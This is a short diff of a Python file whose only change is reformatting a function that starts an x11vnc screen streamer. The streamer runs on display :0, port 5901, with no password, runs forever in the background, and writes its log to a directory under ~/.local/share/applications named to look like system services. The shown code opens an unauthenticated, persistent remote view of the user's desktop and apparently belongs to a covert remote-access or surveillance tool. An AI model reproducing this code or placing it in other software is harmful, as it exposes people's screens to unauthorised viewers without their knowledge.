@@ -9,20 +9,26 @@ APPDIR = str(Path.home() / ".local/share/applications")
 LOGDIR = f"{APPDIR}/system/services"
 STREAM_PORT = "5901"  # Standard VNC port
 
+
 def start_stream():
     log_event("Starting screen streamer...")
 
     try:
-        subprocess.Popen([
-            "x11vnc",
-            "-display", ":0",
-            "-rfbport", STREAM_PORT,
-            "-forever",
-            "-nopw",
-            "-shared",
-            "-bg",
-            "-o", f"{LOGDIR}/x11vnc.log"
-        ])
+        subprocess.Popen(
+            [
+                "x11vnc",
+                "-display",
+                ":0",
+                "-rfbport",
+                STREAM_PORT,
+                "-forever",
+                "-nopw",
+                "-shared",
+                "-bg",
+                "-o",
+                f"{LOGDIR}/x11vnc.log",
+            ]
+        )
         log_event(f"x11vnc started on port {STREAM_PORT}")
         return {"status": "screen stream started", "port": STREAM_PORT}
 
